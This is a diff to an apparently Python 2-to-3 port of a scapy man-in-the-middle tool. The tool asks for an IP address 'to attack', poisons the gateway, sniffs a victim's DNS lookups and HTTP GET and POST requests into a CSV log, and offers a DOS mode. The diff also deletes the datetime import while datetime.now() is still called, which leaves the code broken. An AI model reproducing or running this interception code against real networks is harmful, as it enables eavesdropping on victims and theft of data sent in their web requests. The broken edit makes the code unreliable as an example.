@@ -4,7 +4,6 @@ from scapy.all import *
 import threading
 import os
 import sys
-from datetime import datetime
 import utils
 
 # gets mac address from ip
@@ -39,6 +38,7 @@ def gw_poison():
 
 # captures, displays and exentually saves the required traffic of a packet
 def sniff_request():
+	print("sniff_req")
 	if SNIFF_SERVICES[SNIFF_SERVICE] == "DNS":
 		sniff(iface=INTERFACE, filter="udp port 53", prn=dns_sniff_request)
 	elif SNIFF_SERVICES[SNIFF_SERVICE] == "HTTP GET":
@@ -54,6 +54,7 @@ def sniff_request():
 
 # capture, displays and eventually saves all the services provided by this program from a packet
 def sniff_all(pkt):
+	print("sniff_all")
 	# if pkt.haslayer(TCP) and pkt.getlayer(IP).src==V_IP : print(str(pkt.getlayer(TCP)))
 	dns_sniff_request(pkt)
 	http_sniff_get_request(pkt)
@@ -62,6 +63,7 @@ def sniff_all(pkt):
 
 # captures, displays and eventually saves dns traffic of a packet
 def dns_sniff_request(pkt):
+	print("dns_sniff_req")
 	# adding sourcecondition
 	try:
 		pkt.getlayer(IP).src
@@ -77,13 +79,13 @@ def dns_sniff_request(pkt):
 		date = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
 		print(
 			date
-			+ " Service: DNS"
-			+ " Victim: "
-			+ pkt.getlayer(IP).src
-			+ " ("
-			+ pkt.getlayer(Ether).src
-			+ ") is resolving "
-			+ pkt.getlayer(DNS).qd.qname
+			, " Service: DNS"
+			, " Victim: "
+			, pkt.getlayer(IP).src
+			, " ("
+			, pkt.getlayer(Ether).src
+			, ") is resolving "
+			, pkt.getlayer(DNS).qd.qname
 		)
 		if not SAVE_FILE_PATH == "":
 			utils.save_to_csv_file(
@@ -100,6 +102,7 @@ def dns_sniff_request(pkt):
 
 # captures, displays and eventually saves http GET requests
 def http_sniff_get_request(pkt):
+	print("http_get_req")
 	if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80:
 		try:
 			# getting GET request and Host header
@@ -156,6 +159,7 @@ def http_sniff_get_request(pkt):
 
 # captures, displays and eventually saves http POST requests
 def http_sniff_post_request(pkt):
+	print("http_post_req")
 	if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80:
 		try:
 			# getting GET request and Host header
@@ -238,16 +242,16 @@ DEFAULT_INTERFACE = "wlan0"
 
 # receiving user input
 print("\n" + "=" * 20 + " TARGETS DEFINITION " + "=" * 20)
-V_IP = raw_input("Insert the IP address to attack: ")
-GW_IP = raw_input(
+V_IP = input("Insert the IP address to attack: ")
+GW_IP = input(
 	'Insert the gateway IP address [default "' + DEFAULT_GATEWAY_IP + '"]: '
 )
-INTERFACE = raw_input(
+INTERFACE = input(
 	'Insert the network interface name [default "' + DEFAULT_INTERFACE + '"]: '
 )
 print("=" * 20 + " ATTACK TYPE DEFINITION " + "=" * 20)
 ATTACK_TYPE = 0
-ATTACK_TYPE_INPUT = raw_input(
+ATTACK_TYPE_INPUT = input(
 	"Choose tattack type:\n" + "\t[0, empty, invalid] SNIFF\n" + "\t[1] DOS\n"
 )
 try:
@@ -258,7 +262,7 @@ except ValueError:
 SNIFF_SERVICE = 0
 SAVE_FILE_PATH = ""
 if ATTACK_TYPE == ATTACK_TYPE_SNIFF:
-	SNIFF_SERVICE_INPUT = raw_input(
+	SNIFF_SERVICE_INPUT = input(
 		"Choose tattack type:\n"
 		+ "\t[0, empty, invalid] ALL AVAILABLE\n"
 		+ "\t[1] HTTP GET\n"
@@ -269,7 +273,7 @@ if ATTACK_TYPE == ATTACK_TYPE_SNIFF:
 		SNIFF_SERVICE = int(SNIFF_SERVICE_INPUT)
 	except ValueError:
 		pass
-	SAVE_FILE_PATH = raw_input(
+	SAVE_FILE_PATH = input(
 		"Save output file name or path (output file is a csv file) [empty means no saving file]: "
 	)
 
@@ -313,7 +317,7 @@ else:
 	print("Fatal Error, ATTACK_TYPE not defined\nAborting...")
 	sys.exit(1)
 print("Type anything to start the attack:")
-raw_input()
+input()
 
 # getting victim and gateway mac address by iterating research until both are found
 print("Obtaining MAC addresses (may take a few attempts)...")
